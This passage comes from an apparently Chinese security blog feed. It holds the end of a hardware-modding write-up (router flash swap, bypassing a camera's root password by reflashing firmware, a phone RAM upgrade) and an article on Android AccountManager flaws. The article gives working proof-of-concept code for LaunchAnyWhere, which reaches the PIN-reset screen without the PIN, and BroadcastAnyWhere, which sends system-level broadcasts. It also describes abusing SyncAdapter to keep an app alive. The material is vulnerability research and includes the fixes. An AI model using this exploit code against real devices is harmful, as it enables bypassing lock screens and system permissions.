<p>对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153819.jpg" alt=""></p>
<p>先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153823.jpg" alt=""></p>
<p>确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160657.jpg" alt=""></p>
<h3 id="刷编程器固件"><a href="#刷编程器固件" class="headerlink" title="刷编程器固件"></a>刷编程器固件</h3><p>在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_161309.jpg" alt=""></p>
<p>芯片放置在烧录座中，用烧录座连接编程器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154759.jpg" alt=""></p>
<p>编程器刷入固件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606164128.png" alt=""></p>
<h3 id="更换闪存芯片"><a href="#更换闪存芯片" class="headerlink" title="更换闪存芯片"></a>更换闪存芯片</h3><p>把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。<br>存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_171616.jpg" alt=""></p>
<h3 id="硬改完成"><a href="#硬改完成" class="headerlink" title="硬改完成"></a>硬改完成</h3><p>全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：<a href="http://192.168.1.1/" rel="external nofollow noopener noreferrer" target="_blank">http://192.168.1.1/</a> 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613191402.jpg" alt=""></p>
<p>openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。</p>
<h2 id="体外分离硬破摄像头"><a href="#体外分离硬破摄像头" class="headerlink" title="体外分离硬破摄像头"></a>体外分离硬破摄像头</h2><h3 id="修改方案-1"><a href="#修改方案-1" class="headerlink" title="修改方案"></a>修改方案</h3><p>在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614141635.jpg" alt=""></p>
<p>尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161328.jpg" alt=""></p>
<p>成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161037.jpg" alt=""></p>
<p>然而事情并不简单。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/sdfsdfsf5656.jpg" alt=""></p>
<p>固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614_115142.jpg" alt=""></p>
<h3 id="拆存储芯片"><a href="#拆存储芯片" class="headerlink" title="拆存储芯片"></a>拆存储芯片</h3><p>固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。<br>首先拆掉芯片，周围同样采用胶带保护一下。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161733.jpg" alt=""></p>
<h3 id="飞线芯片烧录座"><a href="#飞线芯片烧录座" class="headerlink" title="飞线芯片烧录座"></a>飞线芯片烧录座</h3><p>飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_161048.jpg" alt=""></p>
<p>飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_162135.jpg" alt=""></p>
<p>通电测试，发现机器一切正常，说明改造成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_163009.jpg" alt=""></p>
<h3 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a>烧录固件</h3><p>继续修改固件测试，修改的细节在之后固件修改章节会详细说明，<br>因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614133847.jpg" alt=""></p>
<h3 id="硬破成功"><a href="#硬破成功" class="headerlink" title="硬破成功"></a>硬破成功</h3><p>用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3265e34f0a9.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57a.jpg" alt=""></p>
<h2 id="魔改小米5手机加6G内存"><a href="#魔改小米5手机加6G内存" class="headerlink" title="魔改小米5手机加6G内存"></a>魔改小米5手机加6G内存</h2><h3 id="修改方案-2"><a href="#修改方案-2" class="headerlink" title="修改方案"></a>修改方案</h3><p>小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。</p>
<h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193306.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193313.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193540.jpg" alt=""></p>
<p>主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193901.jpg" alt=""></p>
<h3 id="拆内存芯片"><a href="#拆内存芯片" class="headerlink" title="拆内存芯片"></a>拆内存芯片</h3><p>拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。<br>)<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_141602.jpg" alt=""></p>
<p>取下芯片后，清洁焊盘。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_143142.jpg" alt=""></p>
<h3 id="植锡球"><a href="#植锡球" class="headerlink" title="植锡球"></a>植锡球</h3><p>BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_144833.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_145204.jpg" alt=""></p>
<h3 id="BGA焊接"><a href="#BGA焊接" class="headerlink" title="BGA焊接"></a>BGA焊接</h3><p>先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151437.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151701.jpg" alt=""></p>
<p>焊接完成后，使板子自然冷却，然后清洗干净。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_154349.jpg" alt=""></p>
<h3 id="魔改完成"><a href="#魔改完成" class="headerlink" title="魔改完成"></a>魔改完成</h3><p>装机，然后开机测试，一切正常，说明魔改成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57e.jpg" alt=""></p>
<h2 id="《物联网安全百科》"><a href="#《物联网安全百科》" class="headerlink" title="《物联网安全百科》"></a>《物联网安全百科》</h2><p>伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。<br><a href="https://iot-security.wiki" rel="external nofollow noopener noreferrer" target="_blank">图书阅读:</a> <a href="https://iot-security.wiki/" rel="external nofollow noopener noreferrer" target="_blank">https://iot-security.wiki/</a><br><a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">项目地址:</a> <a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/iot-security-wiki</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
      <category term="硬改" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>Android账户机制漏洞专题</title>
    <link href="http://www.future-sec.com/android-account-manager-vulnerabilitys.html"/>
    <id>http://www.future-sec.com/android-account-manager-vulnerabilitys.html</id>
    <published>2018-06-24T16:00:00.000Z</published>
    <updated>2018-06-29T10:16:12.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）。通俗地讲，就是Android系统会开一个异步进程去帮我们登录（验证）账号，就不需要我们每次点开APP的时候还要走一遍登录（验证）账号的流程。我们根据这个机制，找到了三个可以利用的漏洞。</p>
<h2 id="账户机制介绍"><a href="#账户机制介绍" class="headerlink" title="账户机制介绍"></a>账户机制介绍</h2><p>我们先看一下账户机所运用到的API：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20180629175412.jpg" alt=""></p>
<h3 id="创建账户："><a href="#创建账户：" class="headerlink" title="创建账户："></a>创建账户：</h3><p>首先是class Authenticator extends AbstractAccountAuthenticator ,如下图，该类是账号验证类 ，其中addAccount方法用来定义需要增加账号时的操作，如调用AuthenticatorActivity来进行账号的添加认证：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/1.jpg" alt=""></p>
<h3 id="同步账户："><a href="#同步账户：" class="headerlink" title="同步账户："></a>同步账户：</h3><p>SyncAdapter继承自AbstractThreadedSyncAdapter，SyncAdapter同样需要一个服务（Service）和一个同步适配器(AbstractThreadedSyncAdapter)。SyncAdapter的Service 需要在AndroidManifest里面声明一个带有Intent：android.content.SyncAdapter的Service来达到向系统注册一个具有同步功能的账户适配器(sync-adapter)。同步的方法主要在:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/2.jpg" alt=""></p>
<p>在开发代码中用accountManager调用了addAccount方法后，就可以在android系统的 设置—&gt;账户 里面可以看到我们创建的账户:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/3.png" alt=""></p>
<p>接下来点击Account账户中，可以找到立即同步的按钮，点击的话可以执行“立即同步”，就相当于执行了onPerformSync方法:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/4.png" alt=""></p>
<p>下图为安卓系统添加账户的整体流程图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/5.png" alt=""></p>
<h2 id="漏洞利用及复现"><a href="#漏洞利用及复现" class="headerlink" title="漏洞利用及复现"></a>漏洞利用及复现</h2><h3 id="Launch-Anywhere"><a href="#Launch-Anywhere" class="headerlink" title="Launch Anywhere"></a>Launch Anywhere</h3><p>AccountManagerService是系统服务之一，暴露给开发者的的接口是AccountManager。普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。这个过程如图所示：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/6.png" alt=""></p>
<h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并呼起这个登陆页面。而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity. 如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity。</p>
<p>主要可以利用的代码：<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/** Handles the responses from the AccountManager */</span></div><div class="line"><span class="type">Private</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span> <span class="keyword">extends</span> <span class="title">IAccountManagerResponse</span>.<span class="title">Stub</span> </span>&#123;</div><div class="line">true<span class="type">Public</span> void onResult (<span class="type">Bundle</span> bundle) &#123;</div><div class="line">truetrue<span class="type">Intent</span> intent = bundle.getParcelable(<span class="type">KEY_INTENT</span>);</div><div class="line">truetrue<span class="type">If</span> (intent != <span class="literal">null</span> &amp;&amp; mActivity != <span class="literal">null</span>) &#123;</div><div class="line">truetrue  <span class="comment">// since the user provided an Activity we will silently start intents</span></div><div class="line">truetrue  <span class="comment">// that we see</span></div><div class="line">truetrue  mActivity.startActivity(intent);</div><div class="line">truetruetrue<span class="comment">// leave the Future running to wait for the real response to this request</span></div><div class="line">truetruetrue&#125; <span class="keyword">else</span> <span class="keyword">if</span> (bundle.getBoolean (<span class="string">"retry"</span>)) &#123;</div><div class="line">          ...</div></pre></td></tr></table></figure></p>
<h4 id="复现代码："><a href="#复现代码：" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public <span class="keyword">Bundle </span><span class="keyword">addAccount(AccountAuthenticatorResponse </span>response,</div><div class="line">                         String accountType, String authTokenType,</div><div class="line">                         String[] requiredFeatures, <span class="keyword">Bundle </span>options)</div><div class="line">        throws NetworkErrorException &#123;</div><div class="line">    Intent intent = new Intent()<span class="comment">;</span></div><div class="line">    intent.setComponent(new ComponentName(</div><div class="line">            <span class="string">"com.android.settings"</span>,</div><div class="line">            <span class="string">"com.android.settings.ChooseLockPassword"</span>))<span class="comment">;</span></div><div class="line">    intent.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">    intent.putExtra(<span class="string">"confirm_credentials"</span>,false)<span class="comment">;</span></div><div class="line">    final <span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">    <span class="keyword">bundle.putParcelable(AccountManager.KEY_INTENT, </span>intent)<span class="comment">;</span></div><div class="line">    return <span class="keyword">bundle;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在继承了AbstractAccountAuthenticator的类中，我们重写了addAccount方法，配置一个可以打开修改pin码的系统级别的intent，然后再return 带有这个intent的bundle，系统得到这个bundle之后就会去启动这个intent，进而打开重置pin码的页面。</p>
<p>MainAcitivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Intent intent1 = new Intent()<span class="comment">;</span></div><div class="line">intent1.setComponent(new ComponentName(</div><div class="line">        <span class="string">"com.android.settings"</span>,</div><div class="line">        <span class="string">"com.android.settings.accounts.AddAccountSettings"</span>))<span class="comment">;</span></div><div class="line">intent1.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">String authTypes[] = &#123;TYPE &#125;<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"account_types"</span>, authTypes)<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"authTypes"</span>, authTypes)<span class="comment">;</span></div><div class="line">this.startActivity(intent1)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>这里我们只是在主类中启动了账户页面，并且进入创建账户的页面，从而触发AbstractAccountAuthenticator类中我们重写的addAccount方法，进入重置pin码的界面。</p>
<h4 id="复现截图："><a href="#复现截图：" class="headerlink" title="复现截图："></a>复现截图：</h4><ol>
<li><p>我们先设置初始pin码为123456，锁屏后需要输入123456来解锁手机。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/7.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/8.png" alt=""></p>
</li>
</ol>
<p>然后进入手机后，打开我们的APP，就能绕过pin码验证直接跳转到重置pin码界面。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/9.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/10.png" alt=""></p>
<ol>
<li>我们也可以通过调用一些特殊应用的的用户资料界面，这种界面的exported属性一般是false，protectlevel属性signature，在这里也是可以直接导出，直接获取到其的个人敏感信息。（这里就不写相应的代码）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/11.png" alt=""><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4>安卓4.4已经修复了这个漏洞，检查了Step3中返回的intent所指向的Activity和AppB是否是有相同签名的。避免了launch Anywhere的可能。修复代码如下：<figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">If</span> (PackageManager.SIGNATURE_MATCH !=</div><div class="line">                        pm.checkSignatures(authenticatorUid, targetUid)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(</div><div class="line">                            <span class="string">"Activity to be started with KEY_INTENT must "</span> +</div><div class="line">                            <span class="string">"share Authenticator's signatures"</span>)<span class="comment">;</span></div><div class="line">                &#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/12.png" alt=""></p>
<h3 id="Broadcast-Anyway"><a href="#Broadcast-Anyway" class="headerlink" title="Broadcast Anyway"></a>Broadcast Anyway</h3><p>继上面Android的LaunchAnyWhere组件安全漏洞后，最近Google在Android 5.0的源码上又修复了一个高危漏洞，该漏洞简直是LaunchAnyWhere的姊妹版——BroadcastAnyWhere。通过这个漏洞，攻击者可以以system用户的身份发送广播，这意味着攻击者可以无视一切的BroadcastReceiver组件访问限制。而且该漏洞影响范围极广，Android 2.0+至4.4.x都受影响。</p>
<h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>BroadcastAnyWhere跟LaunchAnyWhere的利用原理非常类似，两者都利用了Setting的uid是system进程高权限操作。漏洞同样发生在Setting的添加账户的addAccount方法上。根据之前的addAccount方法中我们看到有个参数是Bundle类型的，参数名为options，该参数内部附带有添加用户用的额外信息，我们用代码展示一下内部的信息：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/13.png" alt=""></p>
<p>可以看到，该额外参数告诉我们，执行添加账户的用户id是1000，也就是系统用户，有root权限，还有个参数是pendingIntent，该参数是主要是作为身份识别用的，也是具有系统权限的，我们攻击的切入点就是pendingIntent。</p>
<h4 id="pendingIntent介绍："><a href="#pendingIntent介绍：" class="headerlink" title="pendingIntent介绍："></a>pendingIntent介绍：</h4><p>PendingIntent对象可以按预先指定的动作进行触发，当这个对象传递（通过binder）到其他进程（不同uid的用户）,其他进程利用这个PendingIntent对象，可以原进程的身份权限执行指定的触发动作，这有点类似于Linux上suid或guid的效果。另外，由于触发的动作是由系统进程执行的，因此哪怕原进程已经不存在了，PendingIntent对象上的触发动作依然有效。</p>
<h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>PendingIntent提供了一个方法为send (Context context, int code, Intent intent, PendingIntent.OnFinished onFinished, Handler handler, String requiredPermission, Bundle options)，里面可以传一个参数为Intent intent，而在5.0的版本之前，我们可以对intent进行任意构造，然后通过pendingIntent发送出去。攻击思路如图：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/14.png" alt=""></p>
<h4 id="复现代码：-1"><a href="#复现代码：-1" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PendingIntent pending_intent = (PendingIntent) <span class="keyword">options</span>.get(<span class="string">"pendingIntent"</span>);</div><div class="line">Intent intent = <span class="keyword">new</span> Intent();</div><div class="line">intent.setAction(<span class="string">"android.intent.action.BOOT_COMPLETED"</span>);</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    pending_intent.send(context, <span class="number">0</span>, intent, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (PendingIntent.CanceledException e) &#123;</div><div class="line">    Log.e(<span class="string">"addAccount Exception"</span>, e.toString());</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">options</span>;</div></pre></td></tr></table></figure></p>
<p>这里我们在addAccount方法里获取pendingIntent,然后声明一个启动成功Action的Intent，最后让pendingIntent发送带有启动成功Action的广播。由于pendingIntent是系统级别的，所以发出的广播也是系统级别的，于是android系统就会收到该广播，然后执行系统启动成功之后的逻辑。</p>
<h4 id="复现截图：-1"><a href="#复现截图：-1" class="headerlink" title="复现截图："></a>复现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/15.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/16.png" alt=""></p>
<h4 id="漏洞修复：-1"><a href="#漏洞修复：-1" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>Android 5.0的源码中修复了该漏洞，方法是把放入mPendingIntent的intent，由原来简单的new Intent()改为事先经过一系列填充的identityIntent。这样做，就可以防止第三方的Authenticator（主要是针对木马）进行二次填充。修复代码如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Intent identityIntent = new Intent()<span class="comment">;  </span></div><div class="line">identityIntent.setComponent(new ComponentName(<span class="keyword">SHOULD_NOT_RESOLVE, </span><span class="keyword">SHOULD_NOT_RESOLVE)); </span> </div><div class="line">identityIntent.setAction(<span class="keyword">SHOULD_NOT_RESOLVE); </span> </div><div class="line">identityIntent.<span class="keyword">addCategory(SHOULD_NOT_RESOLVE); </span> </div><div class="line">mPendingIntent = PendingIntent.getBroadcast(this, <span class="number">0</span>, identityIntent, <span class="number">0</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/17.png" alt=""></p>
<h3 id="系统拉活进程"><a href="#系统拉活进程" class="headerlink" title="系统拉活进程"></a>系统拉活进程</h3><p>之前在做项目的时候，为了保证APP可以在手机长期存活，我找到了利用Android账户同步机制来拉活APP的进程。在华为6.0、4.4的版本测试可以拉活，在oppo5.0版本测试可以拉活，但是在小米6.0下，杀死进程后就无法通过账户机制拉活，我猜测是小米对账户机制进行了修改。</p>
<h4 id="SyncAdapter介绍："><a href="#SyncAdapter介绍：" class="headerlink" title="SyncAdapter介绍："></a>SyncAdapter介绍：</h4><p> Android提供了SyncAdapter类用于需要同步本地数据和在线账户信息的应用，如电子邮件的定时收取、笔记应用的云备份、天气应用的及时同步等。它的优势在于可以根据不同条件自动发起数据传输，比如数据变更，间隔一定时间，或者是每天定时。而且，系统会将暂时不能运行的操作添加到队列里，在可能的情况下重新发起。</p>
<h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p> 因为账户同步服务是系统维护的一个服务，所以我们的同步的进程是跟随系统的生命周期走，这就意味着只要不关机，这个服务会一直运行，帮我们同步账号。我们看一下功能流程图：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/18.png" alt=""></p>
<p>上图是我总结了Android利用SyncAdapter同步账户的逻辑，而开发者可以随意重写onPerformSync()的内容，因此我们可以在onPerformSync()方法中去开启我们APP的Activity、Service等，一旦启动了Activity、Service之后，就等于拉活了我们APP的进程。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/19.png" alt=""></p>
